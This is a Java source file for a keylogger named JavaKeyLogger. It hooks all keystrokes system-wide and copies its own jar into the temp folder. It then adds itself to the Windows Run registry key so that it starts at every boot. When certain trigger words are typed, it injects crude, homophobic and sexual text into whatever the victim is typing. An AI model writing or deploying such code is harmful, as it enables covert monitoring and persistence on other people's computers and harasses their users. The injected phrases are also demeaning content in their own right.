import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Random;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class JavaKeyLogger implements NativeKeyListener {
	private String lastKeys;
	private Robot r;
	private Keyboard keyboard;

	public JavaKeyLogger() {
		checkRegistry();
		checkJarFile();
		try {
			keyboard = new Keyboard();
		} catch (AWTException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		lastKeys = new String();
		try {
			r = new Robot();
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void nativeKeyPressed(NativeKeyEvent e) {

		lastKeys += NativeKeyEvent.getKeyText(e.getKeyCode());
		System.out.println("Key Pressed: "
				+ NativeKeyEvent.getKeyText(e.getKeyCode()));

		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
			GlobalScreen.unregisterNativeHook();
		}
		checkLastKeys();
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Key Released: "
				+ NativeKeyEvent.getKeyText(e.getKeyCode()));

	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	}

	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			System.err
					.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		// Construct the example object and initialze native hook.
		GlobalScreen.getInstance().addNativeKeyListener(new JavaKeyLogger());
	}

	private void checkLastKeys() {
		lastKeys = lastKeys.toLowerCase();
		if (lastKeys.endsWith("arturo")) {
			troll();
		} else if (lastKeys.endsWith("asian")) {
			troll();
		} else if (lastKeys.endsWith("amateur")) {
			troll();
		} else if (lastKeys.endsWith("blowjob")) {
			troll();
		}
	}

	private void troll() {
		lastKeys = "";
		Random rand = new Random();
		switch (rand.nextInt(5) % 5) {
		case 0:
			keyboard.type(" sweet pumpkin");
			break;
		case 1:
			keyboard.type(" gay");
			break;
		case 2:
			keyboard.type(" in the ass");
			break;
		case 3:
			keyboard.type(" el mascapo");
			break;
		case 4:
			keyboard.type(" el sucio");
			break;
		default:
			keyboard.type("strich");
		}
	}

	private void checkRegistry() {
		String added = "";
		String tempPath=System.getProperty("java.io.tmpdir");
		try {
			added = WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE,
					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "jkl");
		} catch (IllegalArgumentException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			e.printStackTrace();
		}
		if(added!=null && added.equalsIgnoreCase("javaw -Xmx200m -jar "+tempPath+"jkl.jar")){
			return;
		}
		else{
			if(added!=null){
				try {
					WinRegistry.deleteValue(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "jkl");
				} catch (IllegalArgumentException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				} catch (IllegalAccessException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				} catch (InvocationTargetException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
			
			try {
				WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE,
						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
						"jkl", "javaw -Xmx200m -jar "+tempPath+"jkl.jar");
			} catch (IllegalArgumentException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private void checkJarFile() {
		File file = new File(System.getProperty("java.io.tmpdir")+"jkl.jar");
		if (file.exists()) {
			return;
		}
		File standardLocation = new File(System.getProperty("java.io.tmpdir"));

		String actualPath = ClassLoader.getSystemClassLoader().getResource(".")
				.getPath()
				+ "jkl.jar";
		File origin = new File(actualPath);
		try {
			Path source = origin.toPath();
			Path newdir = standardLocation.toPath();
			Files.copy(source, newdir.resolve(source.getFileName()), REPLACE_EXISTING);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}